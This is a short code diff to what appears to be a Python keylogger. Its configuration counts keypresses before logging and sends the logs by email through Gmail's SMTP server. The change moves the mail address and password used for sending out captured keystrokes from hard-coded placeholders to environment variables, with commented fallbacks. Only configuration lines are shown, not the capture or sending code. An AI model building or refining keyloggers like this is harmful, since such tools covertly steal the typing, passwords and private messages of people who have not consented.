@@ -43,8 +43,14 @@ LOG_INTERVAL = 60  # seconds between log flush or checks, if needed
 KEYS_BEFORE_WRITE = 20 # log keys after these many keypresses
 
 # ------------------------------------------------------------------------------
-MAIL_ADDRESS = "YOUR_EMAIL@gmail.com"
-MAIL_PASSWORD = "YOUR_PASSWORD"
+
+# Load credentials from environment variables (safer than hard-coding)
+MAIL_ADDRESS = os.environ.get("LOG_MAIL_ADDRESS")
+MAIL_PASSWORD = os.environ.get("LOG_MAIL_PASSWORD")
+
+# If you prefer, uncomment and set:
+# MAIL_ADDRESS = "YOUR_EMAIL@gmail.com"
+# MAIL_PASSWORD = "YOUR_PASSWORD"
 
 SMTP_SERVER = "smtp.gmail.com"
 SMTP_PORT = 587
